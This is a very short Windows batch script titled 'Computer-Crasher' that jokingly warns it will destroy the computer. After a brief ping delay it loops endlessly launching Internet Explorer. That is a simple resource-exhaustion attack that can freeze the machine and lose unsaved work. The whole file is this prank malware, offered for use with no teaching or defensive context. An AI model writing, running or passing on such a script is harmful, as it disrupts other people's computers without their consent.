@echo off
Computer-Crasher
================

echo This will Destroy your Computer :D
pause
cls
ping localhost -n 5 >null
:a
start iexplore.exe
GOTO :a
